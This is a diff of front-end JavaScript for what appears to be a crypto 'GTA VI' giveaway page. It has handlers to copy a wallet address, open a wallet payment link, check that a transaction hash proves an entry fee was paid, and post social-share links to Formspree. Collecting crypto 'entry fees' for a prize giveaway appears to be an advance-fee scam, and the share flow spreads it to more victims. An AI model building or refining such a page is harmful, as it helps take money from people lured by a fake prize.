+    modal.setAttribute('aria-hidden', 'true');
+    document.body.classList.remove('locked');
+  }
+
+  function syncSticky(){
+    $('#stickyBtn').textContent = entered ? 'Entry sent ✓' : 'Enter now';
+  }
+  syncSticky();
+
+  document.addEventListener('click', e => {
+    if (e.target.closest('[data-open-modal]')){ e.preventDefault(); openModal(); }
+    if (e.target.closest('[data-close]')){ e.preventDefault(); closeModal(); }
+  });
+
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape' && modal.getAttribute('aria-hidden') === 'false') closeModal();
+  });
+
+  $$('.net').forEach(btn => {
+    btn.addEventListener('click', () => {
+      currentNet = btn.dataset.net;
+      renderNet();
+      buzz(8);
+    });
+  });
+
+  $('#copyAddr').addEventListener('click', async () => {
+    const ok = await copyText(ADDRESS);
+    const code = $('#addrVal');
+    code.classList.remove('flash');
+    void code.offsetWidth;
+    code.classList.add('flash');
+    toast(ok ? '✓ Wallet address copied' : 'Copy failed — long-press the address');
+    if (ok) buzz(14);
+  });
+
+  $('#openWallet').addEventListener('click', async () => {
+    const uri = walletURI();
+    const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    if (isMobile){
+      try { window.location.href = uri; } catch(e){}
+      setTimeout(() => toast('If nothing opened, copy the address manually'), 900);
+    } else {
+      const ok = await copyText(uri);
+      toast(ok ? '✓ Payment link copied — open it on mobile' : 'Copy the address manually');
+    }
+  });
+
+  $('#toForm').addEventListener('click', () => {
+    views.form();
+    setTimeout(() => { const s = $('.sheet'); if (s) s.scrollTop = 0; }, 40);
+  });
+
+  $('#toSocial').addEventListener('click', () => {
+    views.social();
+    setTimeout(() => { const s = $('.sheet'); if (s) s.scrollTop = 0; }, 40);
+  });
+
+  $('#paymentToSocial').addEventListener('click', () => {
+    views.social();
+    setTimeout(() => { const s = $('.sheet'); if (s) s.scrollTop = 0; }, 40);
+  });
+
+  $('#backToOptions').addEventListener('click', () => {
+    views.pay();
+    renderNet();
+  });
+
+  $('#backToPay').addEventListener('click', () => {
+    views.pay();
+    renderNet();
+    setTimeout(() => { const s = $('.sheet'); if (s) s.scrollTop = 0; }, 40);
+  });
+
+  $('#againBtn').addEventListener('click', () => {
+    views.pay();
+    renderNet();
+  });
+
+  $('#entryForm').addEventListener('submit', e => {
+    e.preventDefault();
+    const email   = $('#email');
+    const handle  = $('#handle');
+    const hash    = $('#txhash');
+    const hashErr = $('#hashErr');
+
+    let ok = true;
+    [email, handle].forEach(input => {
+      const valid = input.value.trim().length > 2 &&
+        (input.type !== 'email' || /^\S+@\S+\.\S+$/.test(input.value.trim()));
+      input.style.borderColor = valid ? '' : 'rgba(255,46,136,.85)';
+      if (!valid) ok = false;
+    });
+
+    const hashValid = /^0x[a-fA-F0-9]{64}$/.test(hash.value.trim());
+    hash.style.borderColor = hashValid ? '' : 'rgba(255,46,136,.85)';
+    hashErr.classList.toggle('hidden', hashValid);
+    if (!hashValid) ok = false;
+
+    if (!ok){ toast('Check the highlighted fields'); buzz(24); return; }
+
+    entered = true;
+    try { localStorage.setItem('gtavi_entered', '1'); } catch(err){}
+    syncSticky();
+    $('#receiptFee').textContent = `${NET[currentNet].fee} ${NET[currentNet].ticker}`;
+    views.done();
+    buzz([12, 60, 12]);
+    toast('🎟️ Entry submitted!');
+  });
+
+  $('#socialForm').addEventListener('submit', async e => {
+    e.preventDefault();
+    const form = e.currentTarget;
+    const email = $('#socialEmail');
+    const handle = $('#socialHandle');
+    const links = $$('.social-link-input', form);
+    const error = $('#socialErr');
+    const submitButton = $('button[type="submit"]', form);
+    const emailValid = /^\S+@\S+\.\S+$/.test(email.value.trim());
+    const handleValid = handle.value.trim().length > 1;
+
+    email.style.borderColor = emailValid ? '' : 'rgba(255,46,136,.85)';
+    handle.style.borderColor = handleValid ? '' : 'rgba(255,46,136,.85)';
+
+    const normalizedLinks = links.map(input => {
+      try {
+        const url = new URL(input.value.trim());
+        return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : '';
+      } catch(err){
+        return '';
+      }
+    });
+    const linksValid = links.length === SHAREABLES.length && normalizedLinks.every(Boolean);
+    const uniqueLinks = new Set(normalizedLinks).size === normalizedLinks.length;
+    links.forEach((input, i) => {
+      input.style.borderColor = normalizedLinks[i] ? '' : 'rgba(255,46,136,.85)';
+    });
+
+    if (!emailValid || !handleValid || !linksValid || !uniqueLinks){
+      error.textContent = linksValid && !uniqueLinks
+        ? 'Each card needs a different post link.'
+        : 'Add a valid email, social handle, and a valid post link for every card.';
+      error.classList.remove('hidden');
+      buzz(24);
+      return;
+    }
+
+    error.classList.add('hidden');
+    submitButton.disabled = true;
+    submitButton.textContent = 'Sending links…';
+    const payload = Object.fromEntries(new FormData(form).entries());
+    payload._subject = 'Social giveaway entry links for review';
+    payload.entry_method = 'social-share';
+    payload.card_count = String(SHAREABLES.length);
+
+    try {
+      const response = await fetch(FORMSPREE_URL, {
+        method: 'POST',
+        headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if (!response.ok) throw new Error('Formspree submission failed');
+      form.reset();
+      views.socialDone();
+      buzz([12, 60, 12]);
+    } catch(err){
+      error.textContent = 'We could not submit your links. Please try again.';
+      error.classList.remove('hidden');
+    } finally {
+      submitButton.disabled = false;
+      submitButton.textContent = 'Submit links for review';
+    }
+  });
+
+  $('#goShare').addEventListener('click', () => {
+    closeModal();
+    setTimeout(() => {
+      $('#shares').scrollIntoView({ behavior:'smooth', block:'start' });
+    }, 260);
+  });
+
+  $('#socialBrowse').addEventListener('click', () => {
+    closeModal();
+    setTimeout(() => {
+      $('#shares').scrollIntoView({ behavior:'smooth', block:'start' });
+    }, 260);
+  });
 
   const parallaxLayers = $$('.parallax-layer');
   if (parallaxLayers.length && !window.matchMedia('(prefers-reduced-motion: reduce)').matches){
